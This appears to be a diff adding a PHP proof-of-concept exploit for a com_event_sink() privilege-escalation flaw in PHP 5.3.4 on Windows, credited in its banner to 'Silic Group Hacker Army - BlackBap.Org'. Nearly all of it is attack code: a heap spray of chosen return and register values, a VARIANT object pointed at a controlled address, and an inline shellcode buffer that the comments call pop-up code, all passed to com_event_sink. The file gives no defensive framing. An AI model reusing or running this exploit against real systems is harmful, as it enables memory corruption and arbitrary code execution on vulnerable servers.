@@ -1,0 +1,25 @@
+<?php
+//PHP 5.3.4(Win版) com_event_sink()模型权限提升漏洞
+//$eip ="\x44\x43\x42\x41";
+$eip= "\x4b\xe8\x57\x78";
+$eax ="\x80\x01\x8d\x04";
+$deodrant="";
+$axespray = str_repeat($eip.$eax,0x80);
+//048d0190
+echo strlen($axespray);
+echo "PHP 5.3.4(WIN) COM_SINK Privilege Escalation\n";
+echo "Silic Group Hacker Army - BlackBap.Org";
+//19200 ==4B32 4b00
+for($axeeffect=0;$axeeffect<0x4B32;$axeeffect++){$deodrant.=$axespray;}
+$terminate = "T";
+$u[] =$deodrant;
+$r[] =$deodrant.$terminate;
+$a[] =$deodrant.$terminate;
+$s[] =$deodrant.$terminate;
+//$vVar = new VARIANT(0x048d0038+$offset);        这里是可控可改的
+$vVar = new VARIANT(0x048d0000+180);
+//弹窗代码(Shellcode)
+$buffer = "\x90\x90\x90"."\xB9\x38\xDD\x82\x7C\x33\xC0\xBB"."\xD8\x0A\x86\x7C\x51\x50\xFF\xd3";
+$var2 = new VARIANT(0x41414242);
+com_event_sink($vVar,$var2,$buffer);
+?>
